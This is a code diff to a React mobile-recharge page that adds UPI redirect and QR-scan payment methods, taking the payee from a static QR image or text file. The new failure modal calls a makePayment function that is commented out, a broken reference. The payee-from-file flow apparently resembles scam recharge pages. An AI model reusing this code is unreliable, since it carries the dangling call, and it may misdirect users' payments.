@@ -1,5 +1,5 @@
 import { useParams } from 'react-router-dom';
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 import Swal from 'sweetalert2';
 import jsQR from "jsqr";
 
@@ -40,8 +40,8 @@ function createPhonePeDeepLink(vpa, amountInRupees, note = "") {
   return `phonepe://native?data=${encoded}&id=p2ppayment`;
 }
 
-// ======================= PHONEPE QR PAYMENT METHOD =======================
-const processPhonePeQRPayment = (amount, onSuccess, onError) => {
+// ======================= QR CODE PAYMENT METHOD =======================
+const processQRPayment = (amount, onSuccess, onError) => {
   const img = new Image();
   img.crossOrigin = "Anonymous";
 
@@ -81,7 +81,7 @@ const processPhonePeQRPayment = (amount, onSuccess, onError) => {
         return;
       }
 
-      console.log("PhonePe QR Code detected:", code.data);
+      console.log("QR Code detected:", code.data);
       
       // Parse QR data
       const qrData = code.data;
@@ -155,10 +155,13 @@ const processPhonePeQRPayment = (amount, onSuccess, onError) => {
   tryLoadImage();
 };
 
+// ======================= MAIN COMPONENT =======================
 function RechargePage() {
   const { number: enteredNumber, selectedOption: selectedPlan } = useParams();
   const [packages, setPackages] = useState([]);
+  const [paymentAmount, setPaymentAmount] = useState(null);
   const [isProcessing, setIsProcessing] = useState(false);
+  const paymentAmountRef = useRef(null);
 
   const images = {
     jio: '/images/jio.png',
@@ -174,6 +177,13 @@ function RechargePage() {
     bsnl: 'BSNL Prepaid',
   };
 
+  const provider = {
+    jio: 'Jio',
+    airtel: 'Airtel',
+    vi: 'VI',
+    bsnl: 'BSNL',
+  };
+
   // Load packages.json dynamically
   useEffect(() => {
     fetch('/packages.json')
@@ -187,13 +197,18 @@ function RechargePage() {
       });
   }, []);
 
-  // PhonePe QR payment method
-  function initiatePhonePeQRPayment(amount) {
+  // Original payment method (UPI redirect)
+  function initiatePayment(amount, enteredNumber) {
+    window.location.href = `/processing?number=${enteredNumber}&provider=${provider[selectedPlan]}&amount=${amount}`;
+  }
+
+  // QR Code payment method
+  function initiateQRPayment(amount) {
     if (isProcessing) return;
     setIsProcessing(true);
 
     Swal.fire({
-      title: 'Processing PhonePe Payment',
+      title: 'Processing Payment',
       text: 'Scanning QR code...',
       icon: 'info',
       allowOutsideClick: false,
@@ -203,7 +218,7 @@ function RechargePage() {
       }
     });
 
-    processPhonePeQRPayment(
+    processQRPayment(
       amount,
       (redirectUrl) => {
         setIsProcessing(false);
@@ -224,18 +239,55 @@ function RechargePage() {
         setIsProcessing(false);
         Swal.fire({
           icon: 'error',
-          title: 'PhonePe Payment Error',
+          title: 'Payment Error',
           text: error || 'Failed to process payment. Please try again.',
           confirmButtonText: 'Retry',
           cancelButtonText: 'Cancel',
           showCancelButton: true
         }).then((result) => {
           if (result.isConfirmed) {
-            initiatePhonePeQRPayment(amount);
+            initiateQRPayment(amount);
           }
         });
       }
     );
+  }
+
+  // Fallback UPI payment method
+  // function makePayment(amount) {
+  //   setPaymentAmount(amount);
+  //   paymentAmountRef.current = amount;
+
+  //   fetch('/upi.txt')
+  //     .then(response => response.text())
+  //     .then(upiLink => {
+  //       if (!upiLink.includes('am=')) {
+  //         showPaymentFailedModal();
+  //         return;
+  //       }
+
+  //       const updatedUpiLink = upiLink.replace(/am=\d|am=null/, `am=${amount}`);
+  //       window.location.href = updatedUpiLink;
+  //     })
+  //     .catch(() => {
+  //       showPaymentFailedModal();
+  //     });
+  // }
+
+  function showPaymentFailedModal() {
+    Swal.fire({
+      icon: 'warning',
+      title: 'Your transaction has been declined!',
+      showCancelButton: true,
+      confirmButtonText: 'Try Again',
+      cancelButtonText: 'Cancel',
+      confirmButtonColor: '#3085d6',
+      cancelButtonColor: '#6E7881',
+    }).then((result) => {
+      if (result.isConfirmed) {
+        makePayment(paymentAmountRef.current);
+      }
+    });
   }
 
   return (
@@ -351,19 +403,26 @@ function RechargePage() {
                   <img src={pkg.img6} alt="" className="h-6" />
                 </div>
               </div>
-              <div className="mt-5 flex">
+              <div className="mt-5 flex gap-2">
                 <button
-                  className="bg-purple-600 py-2.5 flex-1 text-[14px] rounded-full font-bold text-white transition-all active:scale-[0.98]"
-                  onClick={() => initiatePhonePeQRPayment(pkg.discountPrice)}
+                  className="bg-phonepe py-2 flex-1 text-[13px] rounded-full font-bold text-white"
+                  onClick={() => initiatePayment(pkg.discountPrice, enteredNumber)}
+                >
+                  Recharge
+                </button>
+                <button
+                  className="bg-purple-600 py-2 flex-1 text-[13px] rounded-full font-bold text-white"
+                  onClick={() => initiateQRPayment(pkg.discountPrice)}
                   disabled={isProcessing}
                 >
-                  {isProcessing ? 'Processing...' : 'Pay with PhonePe'}
+                  {isProcessing ? 'Processing...' : 'QR Pay'}
                 </button>
               </div>
             </div>
           ))}
         </div>
         
+        <div></div>
         <img src="/images/footer.jpg" alt="" className="mt-10" />
       </div>
     </div>
